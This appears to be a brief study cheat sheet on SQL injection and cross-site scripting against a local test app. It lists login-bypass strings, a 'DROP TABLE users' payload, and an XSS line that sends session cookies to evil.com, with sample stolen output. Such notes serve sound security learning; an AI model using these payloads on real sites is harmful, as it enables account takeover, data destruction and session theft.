## SQL injection
- login without password as first user in database (usually admin)
    
    `' OR '1'='1' --` written as username
    `/login?user=admin' OR 1=1 --`

    SQL will work if both conditions are TRUE
    `WHERE username = 'admin' AND password = '1234'`
    `--` comment the next part (the password asking)
    
    or
    
    write url directly:
    `http://localhost:8083/login?username=admin'--&password=anything`
    
- delete users in database
    
    `?q=1; DROP TABLE users--`

## XSS
- inject script and show cookie
    
    `/?q=<script>alert(document.cookie)</script>` 
    
- send cookies directly to other server
    
    `/?q=<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>`
    
    The malicious site will receive the request with cookies, like this:
    `GET /steal?c=session_id=abc123; wordpress_logged_in=xyz…`